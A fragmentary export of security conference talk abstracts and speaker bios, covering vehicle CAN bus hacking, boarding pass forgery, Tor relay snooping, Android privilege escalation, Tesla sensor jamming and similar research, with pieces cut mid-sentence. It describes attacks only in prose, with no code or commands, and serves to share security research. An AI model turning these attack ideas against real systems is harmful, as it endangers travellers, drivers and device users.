 wbie looking to learn more or a security veteran with an established syste

 \, the scope of these differences and the conditions that lead to this beh
 avior are still not well understood. This basic\, undeniable anomaly regar
 ding file storage and recovery begs one simple\, yet critical question: ca
 n the data being mined for evidence be trusted? This talk presents researc
 h on the forensic implications of SSDs from one of the most comprehensive 
 studies to date. The goal of this study was to demonstrate and quantify di
 fferences across a sample pool of drives in an array of tests conducted in
  a controlled environment. These tests explored the variations between dri
 ve firmware\, controllers\, interfaces\, operating systems\, and TRIM stat
 e. Further observations revealed that some drives behaved nearly identical
  to the control drive\, while others showed that the prospects of recoveri
 ng deleted data was significantly reduced. This presentation will demonstr

DESCRIPTION:\n Introduction the Wichcraft Compiler Collection : Towards Un
 iversal Code Theft\n Jonathan Brossard (endrazine) Master of Darkness\, MO
 ABI.com\n \n With this presentation\, we take a new approach to reverse en
 gineering. Instead of attempting to decompile code\, we seek to undo the w
 ork of the linker and produce relocatable files\, the typical output of a 
 compiler. The main benefit of the later technique over the former being th
 at it does work. Once achieved universal code ‘reuse’ by relinking tho
 se relocatable objects as arbitrary shared libraries\, we'll create a form
  of binary reflection\, add scripting capabilities and in memory debugging
  using a JIT compiler\, to attain automated API prototyping and annotation
 \, which\, we will argue\, constitutes a primary form of binary code self 
 awareness. Finally\, we'll see how abusing the dynamic linker internals sh
 all elegantly solve a number of complex tasks for us\, such as calling a g
 iven function within a binary without having to craft a valid input to rea
 ch it. The applications in terms of vulnerability exploitation\, functiona
 l testing\, static analysis validation and more generally computer wizardr

 al with it. Everyone wants to control vehicles and already knows that you 
 can make the horn honk by replaying that frame you captured. But is this a
 ll that there is on this topic? Reversing OEM and third party tools\, capt
 uring firmware update files on the fly\, and hijacking Security Sessions o
 n a bus are just a few examples of things that can be done as well. For th
 is and more\, we will introduce to you the CanBadger! It's not just a logg
 er\, neither an injector. It's a reversing tool for vehicles that allows y
 ou to interact in realtime with individual components\, scan a bus using s
 everal protocols (yup\, UDS is not the only one) and perform a series of t
 ests that no other tool offers. The CanBadger is where the real fun begins
  when dealing with a vehicle\, and you can build it under $60USD! If you a
 re already done with replaying frames on the CAN bus and want to learn how
  that fancy chip-tuning tool deals with your car\, or simply want to get S

  to attack. Networks inside trucks frequently use Internet connected devic
 es even on safety-critical networks where access to brakes and engine cont

 are expensive and proprietary. Six_Volts and Haystack have put together a 
 set of tools that include open hardware and software to make analyzing the

 mercenary" and has worked on High Performance Computing\, embedded systems
 \, vehicle networking and forensics\, electronics prototyping and design\,
  among other things. He's crashed cars for science\, done digital forensic
 s on a tangled mess of wires that used to be a semi truck\, built HPC clus

 ehicle EDRs\, and in his spare time trains teams of students to defend ent
 erprise networks.\n Twitter: @Six_Volts\n \n Haystack Haystack was a compu
 ter science student researching process control security\, when one day he
  was recruited by a nefarious mechanical engineering professor hell-bent o
 n dominating the field of accident reconstruction. After a series of dange
 rous training missions to various accident sites and junkyards\, Haystack 
 can now cut electronic control modules from wrecked trucks with surgical p

DESCRIPTION:\n The Remote Metamorphic Engine: Detecting\, Evading\, Attack
 ing the AI and Reverse Engineering\n Amro Abdelgawad Founder\, Immuneye\n 
 \n As a matter of fact\, it is all about time to reverse engineer the most
  complex piece of code. Code complicity techniques are usually used just t
 o increase the time and effort needed for reverse engineering. The desired
  effect of code complicity can be magnified using mechanisms that decrease
  and narrow the allowed time frame for any reverse engineering attempt int
 o few milliseconds. Such approach can be applied using a metamorphic engin
 e that is aware of the time dimension.\n \n Beyond metamorphic application
 s for AV evasion\, in this talk\, we will present a novel approach to resi
 st and evade reverse engineering using a remote metamorphic engine that ge
 nerates diversified morphed machine code of a very short expiration lifeti
 me. Our approach is based on a client-server model using challenge-respons
 e communication protocol made of morphed machine code rather than data. We
  will show how any reverse engineering attempt on such model will be force
 d to execute or emulate the morphed code. Thus the code will always have a
 n upper hand to detect\, evade and attack the reverse engineering environm
 ent. Our approach is immune to static code analysis as the functionalities
  and the communication protocol used are dynamically diversified remotely 
 and do not exist in packed executable files. On the other hand\, clock syn
 chronized morphed machine code driven by a remote metamorphic engine would
  trap dynamic RE attempts in the maze of metamorphism. One that is immune 
 to code tampering and reversing by detecting the non-self.\n \n We will pr
 esent the fundamental difference between metamorphic and polymorphic techn
 iques used to evade AV compared to the ones that can be used to resist RE.
  We will show how a remote diversified metamorphic self-modifying code wit
 h a very short expiration lifetime can detect\, evade\, and resist any cod
 e analysis\, reverse engineering\, machine learning and tampering attempts

 be any different? As teledildonics come into the mainstream\, human sexual
  pleasure has become connected with the concerns of privacy and security a
 lready familiar to those who previously only wanted to turn on their light
 s\, rather than their lover. Do you care if someone else knows if you or y
 our lover is wearing a remote control vibrator? Do you care if the manufac
 turer is tracking your activity\, sexual health and to whom you give contr
 ol? How do you really know who is making you squirm with pleasure? And wha
 t happens when your government decides your sex toy is an aid to political
  dissidents? Because there’s nothing more sexy than reverse engineering 
 we looked into one product (the We-Vibe 4 Plus from the innocuously named 
 "Standard Innovation Corporation") to get answers for you. Attend our talk
  to learn the unexpected political and legal implications of internet conn
 ected sex toys and\, perhaps more importantly\, how you can explore and ga
 in more control over the intimate devices in your life. Learn the reverse 
 engineering approach we took--suitable for both first timers and the more 
 experienced--to analyze a product that integrates a Bluetooth LE/Smart wir
 eless hardware device\, mobile app and server-side functionality. More par
 ts means more attack surfaces! Alongside the talk\, we are releasing the "
 Weevil" suite of tools to enable you to simulate and control We-Vibe compa
 tible vibrators. We invite you to bring your knowledge of mobile app explo
 its\, wireless communication hijacking (you already hacked your electronic
  skateboard last year\, right?) and back-end server vulnerabilities to the
  party. It’s time for you to get to play with your toys more privately a

  to human sexuality but does not contain sexually explicit material. The p

 ely used anonymity network that protects users' privacy and and identity f
 rom corporations\, agencies and governments. However\, Tor remains a pract
 ical system with a variety of limitations\, some of which were indeed expl
 oited in the recent past. In particular\, Tor's security relies on the fac
 t that a substantial number of its nodes do not misbehave. Previous work s
 howed the existence of malicious participating Tor relays. For example\, t
 here are some Exit nodes that actively interfere with users' traffic and c
 arry out man-in-the-middle attacks. In this work we expose another categor
 y of misbehaving Tor relays (HSDirs)\, that are integral to the functionin
 g of the hidden services and the dark web. The HSDirs act as the DNS direc
 tory for the dark web. Because of their nature\, detecting their malicious
  intent and behavior is much harder. We introduce\, the concept of honey o
 nions (honions)\, a framework to detect misbehaving Tor relays with HSDir 
 capability. By setting up and deploying a large scale honion over Tor for 
 more than 72 days\, we are able to obtain lower bounds on misbehavior amon
 g HSDirs. We propose algorithms to both estimate the number of snooping HS
 Dirs and identify them\, using optimization and feasibility techniques. Ou
 r experimental results indicate that during the period of our work at leas
 t 110 such nodes were snooping information about hidden services they host
 . We reveal that more than half of them were hosted on cloud infrastructur
 e and delayed the use of the learned information to prevent easy traceback
 . Furthermore\, we provide the geolocation map of the identified snooping

 nstorm ideas for new domains to register while taking a shower\, the more 
 successful domain portfolio managers\, working at scale\, are believed to 
 be ‘data driven.’ DNS queries are a material source of intelligence ab
 out domainer opportunities and operations\, and also help us to understand
  the operational constraints around potentially combating domainers\, shou
 ld we want to do so. In this presentation co-authored with Farsight Securi
 ty Scientist Dr. Joe St Sauver\, Farsight Security CEO Dr. Paul Vixie will
  scrutinize failed DNS queries (‘NXDOMAINs’)\, looking for the same 
 ‘opportunities’ that a domainer or typo squatter would (although we wi
 ll not be acting on that data by actually registering domains). Dr. Vixie 
 will discuss two primary types of behavior: 1) Volumetrically-driven typo-
 squatting\, which Dr. Vixie will measure by computing the volume of NXDOMA
 INs seen by domain during a 24 hour period\, and the time between popular 
 typos appearing in NXDOMAINs and those same domains being registered and a
 ctually used\, and 2) Domainers programmatically exploring permutations of
  domains around high value domains\, probing for available domains and aut
 omatically registering the most promising probed domains discovered to sti
 ll be available. Both of these hypothesized behaviors should be externally
  observable and thus able to be confirmed by watching a real-time stream o
 f NXDOMAIN errors\, and a real-time stream of newly observed\, actually-re
 gistered domains\, as available from the Security Information Exchange. Dr
 . Paul Vixie will experimentally confirm these hypothesized relationships 
 and describe examples of (1) the most commonly observed types of typograph
 ical errors\, (2) the brands apparently most-targeted for squatting\, (3) 
 the distribution of delays from NXDOMAIN detection to observed domain use\
 , (4) the potential relationship between NXDOMAIN volume thresholds and TL
 D cost. Dr. Vixie will also explain how this information illuminates oppor
 tunities for tackling these types of domain name abuse. Time will be reser
 ved for Q&A. \n \n Dr. Paul Vixie is the CEO and Co-founder of Farsight Se
 curity. He previously served as President\, Chairman and Founder of Intern

 Commission need to get smarter too. The FTC is the lead federal agency for
  protecting the privacy rights and data security of American consumers. In
  the last year\, it brought several enforcement actions against companies 
 for violating consumer privacy and data security and launched new initiati
 ves – PrivacyCon\, Start with Security\, and a new Office of Technology 
 Research and Investigation– to improve its capabilities and responsivene
 ss to new threats to consumer privacy and security. But the FTC needs your
  help. Today it is announcing a call for research on specific topics in or
 der to broaden its capabilities to protect consumers. Come learn about the
  policy responses to the rise of the machines\, the FTC’s cases and rese
 arch initiatives\, and how you can help.\n \n Terrell McSweeny serves as a
  Commissioner of the Federal Trade Commission. This year marks her third t
 ime at DEF CON . When it comes to tech issues\, Commissioner McSweeny has 
 focused on the valuable role researchers and hackers can play protecting c
 onsumer data security and privacy. She opposes bad policy and legislative 
 proposals like mandatory backdoors and the criminalization of hacking and 
 believes that enforcers like the FTC should work with the researcher commu
 nity to protect consumers. She wants companies to implement security by de
 sign\, privacy by design and data ethics by design –but recognizes that\
 , in the absence of regulation\, enforcement and research are the only mea
 ns of holding companies accountable for the choices they make in the ways 
 that they hold and use consumer data.\n Twitter: @TMcSweenyFTC \n \n Lorri

  By pretending to be a controller connected to a game console\, TASBot tri

 . After a brief overview of video game emulators and the tools they offer\
 , I'll show a live demo of how the high accuracy of these emulators makes 
 it possible to create a frame-by-frame sequence of button presses accurate
  enough to produce the same results even on real hardware. After demonstra

 Arbitrary Code Execution\, ultimately treating the combination of buttons 
 being pressed as opcodes. Using this ability\, I'll execute a payload that

DESCRIPTION:\n Discovering and Triangulating Rogue Cell Towers\n JusticeBe
 aver (Eric Escobar) Security Engineer\, Barracuda Networks Inc\n \n The nu
 mber of IMSI-catchers (rogue cell towers) has been steadily increasing in 
 use by hackers and governments around the world. Rogue cell towers\, which
  can be as small as your home router\, pose a large security risk to anyon
 e with a phone. If in range\, your phone will automatically connect to the
  rogue tower with no indication to you that anything has happened. At that
  point\, your information passes through the rogue tower and can leak sens
 itive information about you and your device. Currently\, there are no easy
  ways to protect your phone from connecting to a rogue tower (aside from s
 ome Android apps which are phone specific and require root access). In thi
 s talk I'll demonstrate how you can create a rogue cell tower detector usi
 ng generic hardware available from Amazon. The detector can identify rogue
  towers and triangulate their location. The demonstration uses a software 
 defined radio (SDR) to fingerprint each cell tower and determine the signa
 l strength of each tower relative to the detector. With a handful of these
  detectors working together\, you can identify when a rogue cell tower ent
 ers your airspace\, as well as identify the signal strength relative to ea
 ch detector. This makes it possible to triangulate the source of the new r
 ogue cell tower.\n \n JusticeBeaver (Eric Escobar) is a Security Engineer

DESCRIPTION:\n How to get good seats in the security theater? Hacking boar
 ding passes for fun and profit. \n Przemek Jaroszewski CERT Polska/NASK\n 
 \n While traveling through airports\, we usually don't give a second thoug
 ht about why our boarding passes are scanned at various places. After all\
 , it's all for the sake of passengers' security. Or is it? The fact that b
 oarding pass security is broken has been proven many times by researchers 
 who easily crafted their passes\, effectively bypassing not just ‘passen
 ger only’ screening\, but also no-fly lists. Since then\, not only secur
 ity problems have not been solved\, but boarding passes have become almost
  entirely bar-coded. And they are increasingly often checked by machines r
 ather than humans. Effectively\, we're dealing with simple unencrypted str
 ings of characters containing all the information needed to decide on our 
 eligibility for fast lane access\, duty-free shopping\, and more... With a
  set of easily available tools\, boarding pass hacking is easier than ever
 \, and the checks are mostly a security theater. In my talk\, I will discu
 ss in depth how the boarding pass information is created\, encoded and val
 idated. I will demonstrate how easy it is to craft own boarding pass that 
 works perfectly at most checkpoints (and explain why it doesn't work at ot
 her ones). I will also discuss IATA recommendations\, security measures im
 plemented in boarding passes (such as digital signatures) and their (in)ef
 fectiveness\, as well as responses I got from different institutions invol
 ved in handling boarding passes. There will be some fun\, as well as some 
 serious questions that I don't necessarily have good answers to. \n \n Prz

  \n \n \n If you’re interested in vulnerability research for fun or prof
 it\, or if you’re a beginner and you’re not sure how to progress\, it 
 can be difficult to sift through the firehose of technical information tha
 t’s out there. Plus there are all sorts of non-technical things that est
 ablished researchers seem to just know. There are many different things to
  learn\, but nobody really talks about the different paths you can take on
  your journey. We will provide an overview of key concepts in vulnerabilit
 y research\, then cover where you can go to learn more - and what to look 
 for. We’ll suggest ways for you to choose what you analyze and provide t
 ools and techniques you might want to use. We’ll discuss different discl
 osure models (only briefly\, we promise!)\, talk about the different kinds
  of responses to expect from vendors\, and give some advice on how to writ
 e useful advisories and how to go about publishing them. Then\, we’ll fi
 nish up by covering some of the ‘mindset’ of vulnerability research\, 
 including skills and personality traits that contribute to success\, the d
 ifferent stages of growth that many researchers follow\, and the different
  feelings (yes\, FEELINGS) that researchers can face along the way. Our en
 d goal is to help you improve your chances of career success\, so you can 
 get a sense of where you are\, where you want to go\, and what you might w
 ant to do to get there. We will not dig too deeply into technical details\
 , and we’d go so far as to say that some kinds of vulnerability research
  do not require deep knowledge anyway. Vulnerability research isn’t for 
 everyone\, but after this talk\, maybe you’ll have a better sense of whe
 ther it’s right for you\, and what to expect going forward.\n \n Joshua

DESCRIPTION:\n Auditing 6LoWPAN Networks using Standard Penetration Testin
 g Tools\n Jonathan-Christofer Demay Airbus Defence and Space Adam Reziouk 
 Arnaud Lebrun\n \n \n \n \n The Internet of Things is expected to be invol
 ved in the near future in all major aspects of our modern society. On that
  front\, we argue that 6LoWPAN is a protocol that will be a dominant playe
 r as it is the only IoT-capable protocol that brings a full IP stack to th
 e smallest devices. As evidence of this\, we can highlight the fact that e
 ven the latest ZigBee Smart Energy standard is based on ZigBee IP which it
 self relies on 6LoWPAN\, a competitor of the initial ZigBee protocol. Effi
 cient IP-based penetration testing tools have been available to security a
 uditors for years now. However\, it is not that easy to use them in the co
 ntext of a 6LoWPAN network since you need to be able to join it first. In 
 fact\, the difficult part is to associate with the underlying IEEE 802.15.
 4 infrastructure.\n Indeed\, this standard already has two iterations sinc
 e its release in 2003 and it provides with several possibilities regarding
  network topology\, data transfer model and security suite. Unfortunately\
 , there is no off-the-shelf component that provides\, out of the box\, wit
 h such a wide range of capabilities. Worst still\, some of them deviate fr
 om the standard and can only communicate with components from the same man
 ufacturer. In this paper\, we present the ARSEN project: Advanced Routing 
 for 6LoWPAN and Ethernet Networks. It provides security auditors with two 
 new tools.\n First\, a radio scanner capable of identifying IEEE 802.15.4 
 infrastructures and for each one of them their specificities\, including s
 everal deviations from the standard that we encountered in actual security
  audits.\n Secondly\, a border router capable of routing IPv6 datagrams be
 tween Ethernet and 6LoWPAN networks while adapting to the specificities id
 entified by the scanner. As a result\, the combination of both effectively
  allows security auditors to use available IP-based penetration testing to
 ols on different 6LoWPAN networks.\n \n Jonathan-Christofer Demay\, PhD is
  the current penetration testing team leader at AIRBUS Defence and Space.

  to find exploitable bugs across both Windows and POSIX kernels\, focusing
  on fuzzing system calls and library calls in the Windows environment. Sys
 tem calls will be briefly explained\, how they work and how these can be f
 uzzed in order to find bugs. The presentation will then move on to explain
 ing core libraries in the Windows environment and how to fuzz these effect
 ively.\n \n Other issues with creating a kernel fuzzing environment will b
 e discussed\, such as effective logging of calls in which the machine coul
 d BSOD and kernel panic\, and how to correctly reproduce vulnerabilities t
 hat have been identified by the fuzzer. We will also cover efficient scali
 ng of a kernel fuzzer so that a number of virtual machines are in operatio

DESCRIPTION:\n How to Do it Wrong: Smartphone Antivirus and Security Appli
 cations Under Fire\n Stephan Huber Fraunhofer SIT\n Siegfried Rasthofer Fr
 aunhofer SIT & TU Darmstadt \n \n \n -Today’s evil often comes in the fo
 rm of ransomware\, keyloggers\, or spyware\, against which AntiVirus appli
 cations are usually an end user’s only means of protection. But current 
 security apps not only scan for malware\, they also aid end users by detec
 ting malicious URLs\, scams or phishing attacks. Generally\, security apps
  appear so self-evidently useful that institutions such as online-banking 
 providers even require users to install anti-virus programs. In this talk\
 , however\, we show that the installation of security applications\, at le
 ast in the context of smartphones\, can sometimes open the phone to a numb
 er of attack vectors\, making the system more instead of less vulnerable t
 o attacks. In a recent research we conducted on Android security apps from
  renowned vendors such as Kaspersky\, McAfee\, Androhelm\, Eset\, Malwareb
 ytes or Avira. When conducting a study of the apps’ security features (A
 ntivirus and Privacy Protection\, Device Protection\, Secure Web Browsing\
 , etc.) it came as a shock to us that every inspected application containe
 d critical vulnerabilities\, and that in the end no single of the promoted
  security features proved to be sufficiently secure. In a simple case\, we
  would have been able to harm the app vendor’s business model by upgradi
 ng a trial version into a premium one at no charge. In other instances\, a
 ttackers would be able to harm the end user by completely disabling the ma
 lware-scanning engine remotely. Or how about accessing confidential data b
 y exploiting broken SSL communication\, broken self-developed "advanced" c
 rypto implementations or through SQL-injections? Yes\, we can. On top\, we
  were able to bypass the secure browsing protection and abuse it for code 
 execution. The most alarming findings\, however\, were security applicatio
 ns that we were able to actually turn into a remote access trojan (RAT) or
  into ransomware. In light of all those findings\, one must seriously ques
 tion whether the advice to install a security app onto one’s smartphone 
 is a wise one. In this talk\, we will not only explain our findings in det
 ail but also propose possible security fixes.\n \n Stephan Huber is a secu
 rity researcher at the testlab mobile security group at the Fraunhofer Ins
 titute for Secure Information Technology (SIT). His main focus is Android 
 application security testing and developing new static and dynamic analysi
 s techniques for app security evaluation. He found different vulnerabiliti
 es in well-known Android applications and the AOSP. In his spare time he e
 njoys teaching students in Android hacking.\n Siegfried Rasthofer is a fou
 rth year PhD student at the TU Darmstadt (Germany) and Fraunhofer SIT and 
 his main research focus is on applied software security on Android applica
 tions. He developed different tools that combine static and dynamic code a
 nalysis for security purposes. He likes to break Android applications and 
 found various AOSP exploits. Most of his research is published at top tier
  academic conferences and very recently he started publishing at industry 
 conferences like BlackHat\, VirusBulletin or AVAR.\n \n

 y\n T Security Researcher\, ERNW GmbH\n \n \n \n As introduced in our form
 er series of talks ‘LTE vs. Darwin‘ there are quite a few of holes in 
 the LTE specs. Now\, having our own Macro BaseStation (an eNodeB) on the d
 esk\, we will demonstrate practical approaches to and attacks on real life
  devices. More and more devices are using mobile radio networks such as GS
 M\, UMTS and LTE and there has already been quite a bit of research on (in
 )securities on the radio part\, but only few people have had a look behind
  the scenes. Luckily\, we had the chance to have just this look and now we
  would like to raise the curtain for the community. Initially we will quic
 kly cover our complete odyssey from starting up an eNodeB for the first ti
 me\, checking out the available interfaces and emulating the core network 
 through to starting attacks. In the main part of the talk we will give a r
 ather practical insight into the (in-)security features of basestations. W
 e will start with valid backend connections and how these connections can 
 be abused to reconfigure both a single eNodeB and a complete subnet on a t
 elco network. We will then continue with the ‘official’ maintenance ap
 proach with the vendor's tools and webinterfaces giving an attacker both l
 ocal and remote access to the device. All in all the talk will cover gener
 al and specific vulnerabilities in both basestations and the backend netwo
 rk.\n \n Hendrik Schmidt and Brian Butterly are seasoned security research
 ers with vast experiences in large and complex enterprise networks. Over t
 he years they focused on evaluating and reviewing all kinds of network pro
 tocols and applications. They love to play with packets and use them for t
 heir own purposes. In this context they learned how to play around with te
 lecommunication networks\, wrote protocol fuzzers and spoofers for testing
  their implementation and security architecture. Both are pentesters and c
 onsultants at the German based ERNW GmbH and will happily share their know
 ledge with the audience.\n \n

 nst Sensors of Self-driving Vehicle\n Jianhao Liu Director of ADLAB\, Qiho
 o 360\n Chen Yan PhD student\, Zhejiang University\n Wenyuan Xu Professor\
 , Electrical Engineering\, Zhejiang University\n \n \n To improve road saf
 ety and driving experiences\, autonomous vehicles have emerged recently\, 
 and they can sense their surroundings and navigate without human inputs. A
 lthough promising and proving safety features\, the trustworthiness of the
 se cars has to be examined before they can be widely adopted on the road. 
 Unlike traditional network security\, autonomous vehicles rely heavily on 
 their sensory ability of their surroundings to make driving decision\, whi
 ch opens a new security risk. Thus\, in this talk we examine the security 
 of the sensors of autonomous vehicles\, and investigate the trustworthines
 s of the 'eyes' of the cars. In this talk\, we investigate sensors whose m
 easurements are used to guide driving\, i.e.\, millimeter-wave radars\, ul
 trasonic sensors\, forward-looking cameras. In particular\, we present con
 tactless attacks on these sensors and show our results collected both in t
 he lab and outdoors on a Tesla Model S automobile. We show that using off-
 the-shelf hardware\, we are able to perform jamming and spoofing attacks\,
  which caused the Tesla's blindness and malfunction\, all of which could p
 otentially lead to crashes and greatly impair the safety of self-driving c
 ars. To alleviate the issues\, at the end of the talk we propose software 
 and hardware countermeasures that will improve sensor resilience against t
 hese attacks.\n \n Jianhao Liu is the director of ADLAB at Qihoo 360. He s

DESCRIPTION:\n Help\, I've got ANTs!!! \n Tamas Szakaly Lead Security Rese
 archer\, PR-Audit Ltd.\, Hungary\n \n As stated in my bio\, besides comput
 er security I also love fligh simulators and mountain biking. Last year I 
 gave a talk about hacking a flight simulator (among other games)\, it was 
 only fitting to research something related to my other hobby too. Old day'
 s bike speedometers have evolved quite a bit\, and nowadays a lot of biker
 s (swimmers\, runners\, ers) do their sport with tiny computers attached t
 o them. These computers do much more than measuring speed: they have GPS\,
  they can store your activities\, can be your training buddy\, and they ca
 n communicate with various sensors (cadence\, power meter\, heart rate mon
 itors\, you name it)\, mobile phones\, each other\, and with PCs. One of t
 he communication protocols used by these devices is ANT. Never heard of it
 ? Not surprising\, it is not very well known despite being utilized by a l
 ot of gadgets including\, but not limited to sport watches\, mobile phones
 \, weight scales\, some medical devices\, and even bicycle lights and rada
 rs. When I bought my first bike computer I rationalized it with thoughts l
 ike ‘this will help me navigate on the mountain’\, or ‘I can track h
 ow much I've developed’\, but deep down I knew the real reason was my cu
 riosity about this lesser known\, lesser researched protocol. One of my fa
 vorite kind of weaknesses are the ones caused by questionable design decis
 ions\, and can be spotted without actual hands-on experience with the prod
 uct itself\, just by reading the documentation. Well this is exactly what 
 happened here\, I had some attack vectors ready and waiting well before I 
 received the actual device. To top it all\, I've also found some implement
 ation bugs after getting my hands on various Garmin devices. After a brief
  introduction to the ANT\, ANT+ and ANT-FS protocols\, I'll explain and de
 mo both the implementation and the protocol weaknesses and reach the alrea
 dy suspected conclusion that ANT and the devices that use it are absolutel
 y insecure: anybody can access your information\, turn off your bike light
 \, or even replace the firmware on your sport watch over the air. \n \n Ta
 mas is the lead IT security researcher at PR-Audit Ltd.\, a company focusi
 ng mainly on penetration testing and SIEM software developing. Previously 
 he participated in a cooperation between ELTE Department of Meteorology an
 d the Paks Nuclear Power Plant Ltd. which goal was to develop TREX\, a tox
 ic waste emission simulator using CUDA. The scene from RoboCop where the k
 id defeats the evil robot with just a laptop and a serial cable made a hug
 e impression on him\, and after seeing the movie\, his path was set: he wa
 s bound to be a hacker. His first experiences in this field involved pokin
 g around various copy protection schemes\, and for this day his favorite a
 reas of expertise are the ones that require some mangling of binary files.
  Besides computer security he also loves mountain biking and flight simula

DESCRIPTION:\n Stumping the Mobile Chipset\n Adam Donenfeld Senior Securit
 y Researcher\, Check Point\n \n \n \n \n Following recent security issues 
 discovered in Android\, Google made a number of changes to tighten securit
 y across its fragmented landscape. However\, Google is not alone in the st
 ruggle to keep Android safe. Qualcomm\, a supplier of 80% of the chipsets 
 in the Android ecosystem\, has almost as much effect on Android’s securi
 ty as Google. With this in mind\, we decided to examine Qualcomm’s code 
 in Android devices. During our research\, we found multiple privilege esca
 lation vulnerabilities in multiple subsystems introduced by Qualcomm to al
 l its Android devices in multiple different subsystems. In this presentati
 on we will review not only the privilege escalation vulnerabilities we fou
 nd\, but also demonstrate and present a detailed exploitation\, overcoming
  all the existing mitigations in Android’s Linux kernel to run kernel-co
 de\, elevating privileges and thus gaining root privileges and completely 
 bypassing SELinux.\n \n Adam Donenfeld is a lead mobile security researche
 r at Check Point with vast experience in the mobile research field. From a
  young age he has been hacking and reverse engineering for fun and profit.
  Prior to Check Point Adam served in an Israeli elite intelligence unit\, 
 as a security researcher. In his free time\, Adam studies German. \n \n
